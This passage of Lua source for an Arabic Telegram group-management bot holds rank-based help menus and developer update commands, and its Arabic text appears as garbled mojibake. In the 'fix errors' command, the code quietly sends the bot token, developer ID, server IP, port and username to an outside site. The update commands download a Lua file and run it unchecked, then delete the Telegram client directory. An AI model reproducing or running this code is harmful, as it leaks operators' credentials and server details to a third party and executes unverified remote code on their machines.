Dev_mfm(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end end
if text == "ุชุนููู ุงูุฑ ู2" and SecondSudo(msg) or text == "ุชุนููู ุงูุฑ ููข" and SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ูููุดุฉ (ู2) ุงูุงู " ,  1, "md")
Devmfm:set(mustafa..'mfm:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local mustafaTEAM =  Devmfm:get(mustafa..'mfm:Help21'..msg.sender_user_id_)
if mustafaTEAM == 'msg' then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญูุธ ุงููููุดู ุงูุฌุฏูุฏู " ,  1, "md")
Devmfm:del(mustafa..'mfm:Help21'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:Help2', text)
Dev_mfm(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text == "ู2" or text == "ููข" or text == "ุงูุงูุฑ2" or text == "ุงูุงูุฑูข" then
if not Admin(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุฐุง ุงูุงูุฑ ูุฎุต ุงูุฑุชุจ ุงูุงุนูู ููุท\nโ๏ธุงุฑุณู โซ (ู6) ูุนุฑุถ ุงูุงูุฑ ุงูุงุนุถุงุก', 1, 'md')
else
local Help = Devmfm:get(mustafa..'mfm:Help2')
local text =  [[
โ๏ธุงูุงูุฑ ุงูุงุฏูููู โซ โค
โ โ โ โ โ โ โ โ โ
โ๏ธุงูุงุนุฏุงุฏุช
โ๏ธุชุงู ูููู 
โ๏ธุงูุดุงุก ุฑุงุจุท
โ๏ธุถุน ูุตู
โ๏ธุถุน ุฑุงุจุท
โ๏ธุถุน ุตูุฑู
โ๏ธุญุฐู ุงูุฑุงุจุท
โ๏ธุญุฐู ุงููุทุงูู
โ๏ธูุดู ุงูุจูุชุงุช
โ๏ธุทุฑุฏ ุงูุจูุชุงุช
โ๏ธุชูุธูู + ุงูุนุฏุฏ
โ๏ธุชูุธูู ุงูุชุนุฏูู
โ๏ธููููู + ุงููููู
โ๏ธุงุณู ุงูุจูุช + ุงูุงูุฑ
โ๏ธุถุน โข ุญุฐู โซ ุชุฑุญูุจ
โ๏ธุถุน โข ุญุฐู โซ ููุงููู
โ๏ธุงุถู โข ุญุฐู โซ ุตูุงุญูู
โ๏ธุงูุตูุงุญูุงุช โข ุญุฐู ุงูุตูุงุญูุงุช
โ โ โ โ โ โ โ โ โ
โ๏ธุถุน ุณุจุงู + ุงูุนุฏุฏ
โ๏ธุถุน ุชูุฑุงุฑ + ุงูุนุฏุฏ
โ โ โ โ โ โ โ โ โ
โ๏ธุฑูุน ูููุฒ โข ุชูุฒูู ูููุฒ
โ๏ธุงููููุฒูู โข ุญุฐู ุงููููุฒูู
โ๏ธูุดู ุงููููุฏ โข ุฑูุน ุงููููุฏ
โ โ โ โ โ โ โ โ โ
โ๏ธุญุฐู โข ูุณุญ + ุจุงูุฑุฏ
โ๏ธููุน โข ุงูุบุงุก ููุน
โ๏ธูุงุฆูู ุงูููุน
โ๏ธุญุฐู ูุงุฆูู ุงูููุน
โ โ โ โ โ โ โ โ โ
โ๏ธุชูุนูู โข ุชุนุทูู โซ ุงูุฑุงุจุท
โ๏ธุชูุนูู โข ุชุนุทูู โซ ุงูุงูุนุงุจ
โ๏ธุชูุนูู โข ุชุนุทูู โซ ุงูุชุฑุญูุจ
โ๏ธุชูุนูู โข ุชุนุทูู โซ ูุดู ุงูุงุนุฏุงุฏุงุช
โ โ โ โ โ โ โ โ โ
โ๏ธุทุฑุฏ ุงููุญุฐูููู
โ๏ธุทุฑุฏ โซ ุจุงูุฑุฏ โข ุจุงููุนุฑู โข ุจุงูุงูุฏู
โ๏ธูุชู โข ุงูุบุงุก ูุชู
โ๏ธุชููุฏ โข ุงูุบุงุก ุชููุฏ
โ๏ธุญุธุฑ โข ุงูุบุงุก ุญุธุฑ
โ๏ธุงูููุชูููู โข ุญุฐู ุงูููุชูููู
โ๏ธุงููููุฏูู โข ุญุฐู ุงููููุฏูู
โ๏ธุงููุญุธูุฑูู โข ุญุฐู ุงููุญุธูุฑูู
โ โ โ โ โ โ โ โ โ
โ๏ธุชูููุฏ ุฏูููู + ุนุฏุฏ ุงูุฏูุงุฆู
โ๏ธุชูููุฏ ุณุงุนู + ุนุฏุฏ ุงูุณุงุนุงุช
โ๏ธุชูููุฏ ููู + ุนุฏุฏ ุงูุงูุงู
โ๏ธุงูุบุงุก ุชูููุฏ โซ ูุงูุบุงุก ุงูุชูููุฏ ุจุงูููุช
โ โ โ โ โ โ โ โ โ
โ๏ธ[๐๐๐๐๐๐ ๐๐๐๐๐](https://t.me/KKDKKB7)
]]
Dev_mfm(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end end
if text == "ุชุนููู ุงูุฑ ู3" and SecondSudo(msg) or text == "ุชุนููู ุงูุฑ ููฃ" and SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ูููุดุฉ (ู3) ุงูุงู " ,  1, "md")
Devmfm:set(mustafa..'mfm:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local mustafaTEAM =  Devmfm:get(mustafa..'mfm:Help31'..msg.sender_user_id_)
if mustafaTEAM == 'msg' then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญูุธ ุงููููุดู ุงูุฌุฏูุฏู " ,  1, "md")
Devmfm:del(mustafa..'mfm:Help31'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:Help3', text)
Dev_mfm(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text == "ู3" or text == "ููฃ" or text == "ุงูุงูุฑ3" or text == "ุงูุงูุฑูฃ" then
if not Admin(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุฐุง ุงูุงูุฑ ูุฎุต ุงูุฑุชุจ ุงูุงุนูู ููุท\nโ๏ธุงุฑุณู โซ (ู6) ูุนุฑุถ ุงูุงูุฑ ุงูุงุนุถุงุก', 1, 'md')
else
local Help = Devmfm:get(mustafa..'mfm:Help3')
local text =  [[
โ๏ธุงูุงูุฑ ุงููุฏุฑุงุก โซ โค
โ โ โ โ โ โ โ โ โ
โ๏ธูุญุต ุงูุจูุช
โ๏ธุถุน ุงุณู + ุงูุงุณู
โ๏ธุงุถู โข ุญุฐู โซ ุฑุฏ
โ๏ธุฑุฏูุฏ ุงููุฏูุฑ
โ๏ธุญุฐู ุฑุฏูุฏ ุงููุฏูุฑ
โ๏ธุญุฐู ููุงุฆู ุงูููุน
โ๏ธููุน โซ ุจุงูุฑุฏ ุนูู ( ููุตู โข ุตูุฑู โข ูุชุญุฑูู )
โ๏ธุญุฐู ูุงุฆูู ููุน + โซ โค
( ุงูุตูุฑ โข ุงููุชุญุฑูุงุช โข ุงูููุตูุงุช )
โ โ โ โ โ โ โ โ โ
โ๏ธุชูุฒูู ุงููู
โ๏ธุฑูุน ุงุฏูู โข ุชูุฒูู ุงุฏูู
โ๏ธุงูุงุฏูููู โข ุญุฐู ุงูุงุฏูููู
โ โ โ โ โ โ โ โ โ
โ๏ธุชุซุจูุช
โ๏ธุงูุบุงุก ุงูุชุซุจูุช
โ๏ธุงุนุงุฏู ุงูุชุซุจูุช
โ๏ธุงูุบุงุก ุชุซุจูุช ุงููู
โ โ โ โ โ โ โ โ โ
โ๏ธุชุบูุฑ ุฑุฏ + ุงุณู ุงูุฑุชุจู + ุงููุต โซ โค
โ๏ธุงููุทูุฑ โข ููุดุฆ ุงูุงุณุงุณู
โ๏ธุงูููุดุฆ โข ุงููุฏูุฑ โข ุงูุงุฏูู
โ๏ธุงููููุฒ โข ุงูููุธู โข ุงูุนุถู
โ๏ธุญุฐู ุฑุฏูุฏ ุงูุฑุชุจ
โ โ โ โ โ โ โ โ โ
โ๏ธุชุบููุฑ ุงูุงูุฏู โซ ูุชุบููุฑ ุงููููุดู
โ๏ธุชุนููู ุงูุงูุฏู โซ ูุชุนููู ุงููููุดู
โ๏ธุญุฐู ุงูุงูุฏู โซ ูุญุฐู ุงููููุดู
โ โ โ โ โ โ โ โ โ
โ๏ธุชูุนูู โข ุชุนุทูู + ุงูุงูุฑ โซ โค
โ๏ธุงุทุฑุฏูู โข ุงูุงูุฏู ุจุงูุตูุฑู โข ุงูุงุจุฑุงุฌ
โ๏ธูุนุงูู ุงูุงุณูุงุก โข ุงูุงูุฑ ุงููุณุจ
โ๏ธุงูุงูุฏู โข ุชุญููู ุงูุตูุบ โข ุงูุงูุฑ ุงูุชุญุดูุด
โ๏ธุฑุฏูุฏ ุงููุฏูุฑ โข ุฑุฏูุฏ ุงููุทูุฑ
โ๏ธุถุงููู โข ุญุณุงุจ ุงูุนูุฑ โข ุงูุฒุฎุฑูู
โ โ โ โ โ โ โ โ โ
โ๏ธ[๐๐๐๐๐๐ ๐๐๐๐๐](https://t.me/KKDKKB7)
]]
Dev_mfm(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end end
if text == "ุชุนููู ุงูุฑ ู4" and SecondSudo(msg) or text == "ุชุนููู ุงูุฑ ููค" and SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ูููุดุฉ (ู4) ุงูุงู " ,  1, "md")
Devmfm:set(mustafa..'mfm:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local mustafaTEAM =  Devmfm:get(mustafa..'mfm:Help41'..msg.sender_user_id_)
if mustafaTEAM == 'msg' then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญูุธ ุงููููุดู ุงูุฌุฏูุฏู" ,  1, "md")
Devmfm:del(mustafa..'mfm:Help41'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:Help4', text)
Dev_mfm(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text == "ููค" or text == "ู4" or text == "ุงูุงูุฑ4" or text == "ุงูุงูุฑูค" then
if not Admin(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุฐุง ุงูุงูุฑ ูุฎุต ุงูุฑุชุจ ุงูุงุนูู ููุท\nโ๏ธุงุฑุณู โซ (ู6) ูุนุฑุถ ุงูุงูุฑ ุงูุงุนุถุงุก', 1, 'md')
else
local Help = Devmfm:get(mustafa..'mfm:Help4')
local text =  [[
โ๏ธุงูุงูุฑ ุงูููุดุฆูู โซ โค
โ โ โ โ โ โ โ โ โ
โ๏ธุชูุฒูู ุงููู
โ๏ธุงูููุฏูุง โข ุงูุณุญ
โ๏ธุงุถู โข ุญุฐู โซ ุงูุฑ
โ๏ธุญุฐู ุงูุงูุงูุฑ ุงููุถุงูู
โ๏ธุงูุงูุงูุฑ ุงููุถุงูู
โ๏ธุงุถู ููุงุท โซ ุจุงูุฑุฏ โข ุจุงูุงูุฏู
โ๏ธุงุถู ุฑุณุงุฆู โซ ุจุงูุฑุฏ โข ุจุงูุงูุฏู
โ๏ธุฑูุน ููุธู โข ุชูุฒูู ููุธู
โ๏ธุงูููุธููู โข ุญุฐู ุงูููุธููู
โ๏ธุฑูุน ูุฏูุฑ โข ุชูุฒูู ูุฏูุฑ
โ๏ธุงููุฏุฑุงุก โข ุญุฐู ุงููุฏุฑุงุก
โ๏ธุชูุนูู โข ุชุนุทูู + ุงูุงูุฑ โซ โค
โ๏ธูุฒููู โข ุงูุณุญ
โ๏ธุงูุญุธุฑ โข ุงููุชู
โ โ โ โ โ โ โ โ โ
โ๏ธุงูุงูุฑ ุงูููุดุฆูู ุงูุงุณุงุณููู โซ โค
โ โ โ โ โ โ โ โ โ
โ๏ธูุถุน ููุจ + ุงูููุจ
โ๏ธุชูุนูู โข ุชุนุทูู โซ ุงูุฑูุน
โ๏ธุฑูุน ููุดุฆ โข ุชูุฒูู ููุดุฆ
โ๏ธุงูููุดุฆูู โข ุญุฐู ุงูููุดุฆูู
โ๏ธุฑูุน โข ุชูุฒูู โซ ูุดุฑู
โ๏ธุฑูุน ุจูู ุงูุตูุงุญูุงุช
โ๏ธุญุฐู ุงูููุงุฆู
โ โ โ โ โ โ โ โ โ
โ๏ธุงูุงูุฑ ููุดุฆ ุงููุฌููุนู โซ โค
โ โ โ โ โ โ โ โ โ
โ๏ธุฑูุน โข ุชูุฒูู โซ ููุดุฆ ุงุณุงุณู
โ๏ธุญุฐู ุงูููุดุฆูู ุงูุงุณุงุณููู 
โ๏ธุงูููุดุฆูู ุงูุงุณุงุณููู 
โ๏ธุญุฐู ุฌููุน ุงูุฑุชุจ
โ โ โ โ โ โ โ โ โ
โ๏ธ[๐๐๐๐๐๐ ๐๐๐๐๐](https://t.me/KKDKKB7)
]]
Dev_mfm(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end end
if text == "ุชุนููู ุงูุฑ ู5" and SecondSudo(msg) or text == "ุชุนููู ุงูุฑ ููฅ" and SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ูููุดุฉ (ู5) ุงูุงู " ,  1, "md")
Devmfm:set(mustafa..'mfm:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local mustafaTEAM =  Devmfm:get(mustafa..'mfm:Help51'..msg.sender_user_id_)
if mustafaTEAM == 'msg' then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญูุธ ุงููููุดู ุงูุฌุฏูุฏู " ,  1, "md")
Devmfm:del(mustafa..'mfm:Help51'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:Help5', text)
Dev_mfm(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text == "ููฅ" or text == "ู5" or text == "ุงูุงูุฑ5" or text == "ุงูุงูุฑูฅ" then
if not SudoBot(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุฐุง ุงูุงูุฑ ูููุทูุฑูู ููุท', 1, 'md')
else
local Help = Devmfm:get(mustafa..'mfm:Help5')
local text =  [[
โ๏ธุงูุงูุฑ ุงููุทูุฑูู โซ โค
โ โ โ โ โ โ โ โ โ
โ๏ธุงููุฑูุจุงุช
โ๏ธุงููุทูุฑูู
โ๏ธุงููุดุชุฑููู
โ๏ธุงูุงุญุตุงุฆูุงุช
โ๏ธุงููุฌููุนุงุช
โ๏ธุงุณู ุงูุจูุช + ุบุงุฏุฑ
โ๏ธุงุณู ุงูุจูุช + ุชุนุทูู
โ๏ธูุดู + -ุงูุฏู ุงููุฌููุนู
โ โ โ โ โ โ โ โ โ
โ๏ธุฑูุน โข ุชูุฒูู โซ ูุฏูุฑ ุนุงู
โ๏ธุญุฐู โข ุงููุฏุฑุงุก ุงูุนุงููู 
โ๏ธุฑูุน โข ุชูุฒูู โซ ุงุฏูู ุนุงู
โ๏ธุญุฐู โข ุงูุงุฏูููู ุงูุนุงููู 
โ๏ธุฑูุน โข ุชูุฒูู โซ ูููุฒ ุนุงู
โ๏ธุญุฐู โข ุงููููุฒูู ุนุงู 
โ โ โ โ โ โ โ โ โ
โ๏ธุงูุงูุฑ ุงููุทูุฑ ุงูุงุณุงุณู โซ โค
โ โ โ โ โ โ โ โ โ
โ๏ธุชุญุฏูุซ
โ๏ธุงููููุงุช
โ๏ธุงููุชุฌุฑ
โ๏ธุงูุณูุฑูุฑ
โ๏ธุฑูุงุจุท ุงููุฑูุจุงุช
โ๏ธุชุญุฏูุซ ุงูุณูุฑุณ
โ๏ธุชูุธูู ุงููุฑูุจุงุช
โ๏ธุชูุธูู ุงููุดุชุฑููู
โ๏ธุญุฐู ุฌููุน ุงููููุงุช
โ๏ธุชุนููู ุงูุงูุฏู ุงูุนุงู
โ๏ธุชุบูุฑ ุงููุทูุฑ ุงูุงุณุงุณู
โ๏ธุญุฐู ูุนูููุงุช ุงูุชุฑุญูุจ
โ๏ธุชุบูุฑ ูุนูููุงุช ุงูุชุฑุญูุจ
โ๏ธุบุงุฏุฑ + -ุงูุฏู ุงููุฌููุนู
โ๏ธุชุนููู ุนุฏุฏ ุงูุงุนุถุงุก + ุงูุนุฏุฏ
โ๏ธุญุธุฑ ุนุงู โข ุงูุบุงุก ุงูุนุงู
โ๏ธูุชู ุนุงู โข ุงูุบุงุก ุงูุนุงู
โ๏ธูุงุฆูู ุงูุนุงู โข ุญุฐู ูุงุฆูู ุงูุนุงู
โ๏ธูุถุน โข ุญุฐู โซ ุงุณู ุงูุจูุช
โ๏ธุงุถู โข ุญุฐู โซ ุฑุฏ ุนุงู
โ๏ธุฑุฏูุฏ ุงููุทูุฑ โข ุญุฐู ุฑุฏูุฏ ุงููุทูุฑ
โ๏ธุชุนููู โข ุญุฐู โข ุฌูุจ โซ ุฑุฏ ุงูุฎุงุต
โ๏ธุฌูุจ ูุณุฎู ุงููุฑูุจุงุช
โ๏ธุฑูุน ุงููุณุฎู + ุจุงูุฑุฏ ุนูู ุงูููู
โ๏ธุชุนููู โข ุญุฐู โซ ููุงุฉ ุงูุงุดุชุฑุงู
โ๏ธุฌูุจ ูููุดู ุงูุงุดุชุฑุงู
โ๏ธุชุบููุฑ โข ุญุฐู โซ ูููุดู ุงูุงุดุชุฑุงู
โ๏ธุฑูุน โข ุชูุฒูู โซ ูุทูุฑ
โ๏ธุงููุทูุฑูู โข ุญุฐู ุงููุทูุฑูู
โ๏ธุฑูุน โข ุชูุฒูู โซ ูุทูุฑ ุซุงููู
โ๏ธุงูุซุงููููู โข ุญุฐู ุงูุซุงููููู
โ๏ธุชุนููู โข ุญุฐู โซ ูููุดุฉ ุงูุงูุฏู
โ๏ธุงุฐุงุนู ูููู ุจุงูุชูุฌูู โซ ุจุงูุฑุฏ
โ โ โ โ โ โ โ โ โ
โ๏ธุชูุนูู ููู + ุงุณู ุงูููู
โ๏ธุชุนุทูู ููู + ุงุณู ุงูููู
โ๏ธุชูุนูู โข ุชุนุทูู + ุงูุงูุฑ โซ โค
โ๏ธุงูุงุฐุงุนู โข ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู
โ๏ธุชุฑุญูุจ ุงูุจูุช โข ุงููุบุงุฏุฑู
โ๏ธุงูุจูุช ุงูุฎุฏูู โข ุงูุชูุงุตู
โ โ โ โ โ โ โ โ โ
โ๏ธ[๐๐๐๐๐๐ ๐๐๐๐๐](https://t.me/KKDKKB7)
]]
Dev_mfm(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end end
if text == "ุชุนููู ุงูุฑ ู6" and SecondSudo(msg) or text == "ุชุนููู ุงูุฑ ููฆ" and SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ูููุดุฉ (ู6) ุงูุงู " ,  1, "md")
Devmfm:set(mustafa..'mfm:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local mustafaTEAM =  Devmfm:get(mustafa..'mfm:Help61'..msg.sender_user_id_)
if mustafaTEAM == 'msg' then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญูุธ ุงููููุดู ุงูุฌุฏูุฏู" ,  1, "md")
Devmfm:del(mustafa..'mfm:Help61'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:Help6', text)
Dev_mfm(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text == "ููฆ" or text == "ู6" or text == "ุงูุงูุฑ6" or text == "ุงูุงูุฑูฆ" then
local Help = Devmfm:get(mustafa..'mfm:Help6')
local text =  [[
โ๏ธุงูุงูุฑ ุงูุงุนุถุงุก โซ โค
โ โ โ โ โ โ โ โ โ
โ๏ธุงูุณูุฑุณ โข ูููุนู โข ุฑุชุจุชู โข ูุนูููุงุชู
โ๏ธุฑุณุงุฆูู โข ุญุฐู ุฑุณุงุฆูู โข ุงุณูู โข ูุนุฑูู 
โ๏ธุงูุฏู โขุงูุฏูู โข ุฌูุงุชู โข ุบูููู โข ุงูุงูุนุงุจ 
โ๏ธููุงุทู โข ุจูุน ููุงุทู โข ุงูููุงููู โข ุฒุฎุฑูู 
โ๏ธุฑุงุจุท ุงูุญุฐู โข ูุฒููู โข ุงุทุฑุฏูู โข ุงููุทูุฑ 
โ๏ธููู ุถุงููู โข ูุดุงูุฏุงุช ุงูููุดูุฑ โข ุงูุฑุงุจุท 
โ๏ธุงูุฏู ุงููุฌููุนู โข ูุนูููุงุช ุงููุฌููุนู 
โ๏ธูุณุจู ุงูุญุจ โข ูุณุจู ุงููุฑู โข ูุณุจู ุงูุบุจุงุก 
โ๏ธูุณุจู ุงูุฑุฌููู โข ูุณุจู ุงูุงููุซู โข ุงูุชูุงุนู
โ โ โ โ โ โ โ โ โ
โ๏ธุตูุงุญูุงุชู
โ๏ธููู + ุงููููู
โ๏ธุฒุฎุฑูู + ุงุณูู
โ๏ธุจุฑุฌ + ููุน ุงูุจุฑุฌ
โ๏ธูุนูู ุงุณู + ุงูุงุณู
โ๏ธุงุญุณุจ + ุชุงุฑูุฎ ูููุงุฏู
โ๏ธุจูุณู โข ุจูุณูุง โซ ุจุงูุฑุฏ
โ๏ธุฑูุน ูุทู โข ุชูุฒูู ูุทู โขุงููุทุงูู
โ๏ธูููู โข ููููุง โซ ุจุงูุฑุฏ โข ุจุงููุนุฑู
โ๏ธุตูุญู โข ุตูุญูุง โซ ุจุงูุฑุฏ โข ุจุงููุนุฑู
โ๏ธุตูุงุญูุงุชู โซ ุจุงูุฑุฏ โข ุจุงููุนุฑู โข ุจุงูุงูุฏู
โ๏ธุงูุฏู โข ูุดู  โซ ุจุงูุฑุฏ โข ุจุงููุนุฑู โข ุจุงูุงูุฏู
โ๏ธุชุญููู + ุจุงูุฑุฏ โซ ุตูุฑู โข ููุตู โข ุตูุช โข ุจุตูู
โ โ โ โ โ โ โ โ โ
โ๏ธ[๐๐๐๐๐๐ ๐๐๐๐๐](https://t.me/KKDKKB7)
]]
Dev_mfm(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end
if SecondSudo(msg) then
if text == "ุชุญุฏูุซ ุงูุณูุฑุณ" or text == "ุชุญุฏูุซ ุณูุฑุณ" then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุฌุงุฑู ุชุญุฏูุซ ุณูุฑุณ ุงูุดูุทุงู', 1, 'md') 
os.execute('rm -rf DEMON.lua') 
os.execute('wget https://raw.githubusercontent.com/mfmvip/DEMONTeam/master/DEMON.lua') 
dofile('DEMON.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n          ( ุชู ุชุญุฏูุซ ุงูุณูุฑุณ )          \n\27[0;34;49m\n") 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุชุญุฏูุซ ุงูู ุงูุงุตุฏุงุฑ ุงูุฌุฏูุฏ', 1, 'md') 
end
if text == 'ุชุญุฏูุซ' or text == 'ุชุญุฏูุซ ุงูุจูุช' or text == 'โซ ุชุญุฏูุซ โ' then  
dofile('DEMON.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n        ( ุชู ุชุญุฏูุซ ูููุงุช ุงูุจูุช )        \n\27[0;34;49m\n") 
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุชุญุฏูุซ ูููุงุช ุงูุจูุช", 1, "md")
end 
if text == 'ุชุตุญูุญ ุงูุงุฎุทุงุก' then
if not Devmfm:get(mustafa..'mfm:Errors') then
Devmfm:set(mustafa..'mfm:Errors',true)
send(msg.chat_id_, msg.id_,'โ๏ธุชู ุชุตุญูุญ ุงุฎุทุงุก ุงูุชุญุฏูุซ ุงููุฏูู')
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
Config = {
DevId = DevId,
TokenBot = TokenBot,
mustafa = TokenBot:match("(%d+)"),
SudoIds = {DevId},
}
https.request("https://apiabs.ml/config.php?Get=mustafa&DevId="..DevId.."&TokenBot="..TokenBot.."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
Create(Config, "./config.lua")   
file = io.open("DEMON.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/mustafaTeam
token="]]..TokenBot..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ"
echo "~ The tg File Was Not Found In The Bot Files"
echo "โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ"
exit 1
fi
if [ ! $token ]; then
echo "โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ"
echo "~ The Token Was Not Found In The config.lua File"
echo "โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ โ"
exit 1
fi
./tg -s ./DEMON.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/mustafaTeam
while(true) do
rm -fr ../.telegram-cli
screen -S mustafa -X kill
screen -S mustafa ./DEMON.sh
done
]]) 
file:close() 
os.execute('unlink RUNmfm.sh;unlink mfm;chmod +x DEMON.sh;chmod +x Run;./Run')
else
send(msg.chat_id_, msg.id_,'โ๏ธูุฏูู ุงุฎุฑ ูุณุฎู ูู ุงูุชุญุฏูุซ ูุงุชูุฌุฏ ุงุฎุทุงุก')
end
end
if text == 'ููู ุงูุงุญุตุงุฆูุงุช' then
local Users = Devmfm:smembers(mustafa.."User_Bot")
local Groups = Devmfm:smembers(mustafa..'Chek:Groups')
local Sudos = Devmfm:smembers(mustafa.."Sudo:User")
if Devmfm:get(mustafa..'Name:Bot') then
Devmfm:set(mustafa..'mfm:NameBot',(Devmfm:get(mustafa..'Name:Bot') or 'ุงูุดูุทุงู'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
Devmfm:sadd(mustafa..'mfm:Users',Users[i]) 
end
end
for i = 1, #Sudos do
Devmfm:sadd(mustafa..'mfm:SudoBot:',Sudos[i]) 
end
for i = 1, #Groups do
Devmfm:sadd(mustafa..'mfm:Groups',Groups[i]) 
if Devmfm:get(mustafa.."Private:Group:Link"..Groups[i]) then
Devmfm:set(mustafa.."mfm:Groups:Links"..Groups[i],Devmfm:get(mustafa.."Private:Group:Link"..Groups[i]))
end
if Devmfm:get(mustafa.."Get:Welcome:Group"..Groups[i]) then
Devmfm:set(mustafa..'mfm:Groups:Welcomes'..Groups[i],Devmfm:get(mustafa.."Get:Welcome:Group"..Groups[i]))
end
local list2 = Devmfm:smembers(mustafa..'Constructor'..Groups[i])
for k,v in pairs(list2) do
Devmfm:sadd(mustafa.."mfm:Constructor:"..Groups[i], v)
end
local list3 = Devmfm:smembers(mustafa..'Basic:Constructor'..Groups[i])
for k,v in pairs(list3) do
Devmfm:sadd(mustafa.."mfm:BasicConstructor:"..Groups[i], v)
end
local list4 = Devmfm:smembers(mustafa..'Manager'..Groups[i])
for k,v in pairs(list4) do
Devmfm:sadd(mustafa.."mfm:Managers:"..Groups[i], v)
end
local list5 = Devmfm:smembers(mustafa..'Mod:User'..Groups[i])
for k,v in pairs(list5) do
Devmfm:sadd(mustafa.."mfm:Admins:"..Groups[i], v)
end
local list6 = Devmfm:smembers(mustafa..'Special:User'..Groups[i])
for k,v in pairs(list6) do
Devmfm:sadd(mustafa.."mfm:VipMem:"..Groups[i], v)
end
Devmfm:set(mustafa.."mfm:Lock:Bots"..Groups[i],"del") Devmfm:hset(mustafa.."mfm:Spam:Group:User"..Groups[i] ,"Spam:User","keed") 
LockList ={'mfm:Lock:Links','mfm:Lock:Forwards','mfm:Lock:Videos','mfm:Lock:Gifs','mfm:Lock:EditMsgs','mfm:Lock:Stickers','mfm:Lock:Farsi','mfm:Lock:Spam','mfm:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
Devmfm:set(mustafa..Lock..Groups[i],true)
end
end
send(msg.chat_id_, msg.id_,'โ๏ธุชู ููู โซ '..#Groups..' ูุฌููุนู\nโ๏ธุชู ููู โซ '..#Users..' ูุดุชุฑู\nโ๏ธูู ุงูุชุญุฏูุซ ุงููุฏูู ุงูู ุงูุชุญุฏูุซ ุงูุฌุฏูุฏ')
end
if text == 'ุงููููุงุช' then
Files = '\nโ๏ธุงููููุงุช ุงูููุนูู ูู ุงูุจูุช โซ โค \nโ โ โ โ โ โ โ โ โ\n'
i = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
i = i + 1
Files = Files..i..'~ : `'..v..'`\n'
end
end
if i == 0 then
Files = 'โ๏ธูุง ุชูุฌุฏ ูููุงุช ูู ุงูุจูุช'
end
send(msg.chat_id_, msg.id_,Files)
end
if text == "ูุชุฌุฑ ุงููููุงุช" or text == 'ุงููุชุฌุฑ' then
local Get_Files, res = https.request("https://raw.githubusercontent.com/mfmvip/DEMONTeamFiles/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\nโ๏ธูุงุฆูุฉ ูููุงุช ูุชุฌุฑ ุณูุฑุณ ุงูุดูุทุงู\nโ๏ธุงููููุงุช ุงููุชููุฑู ุญุงููุง โซ โค\nโ โ โ โ โ โ โ โ โ\n"
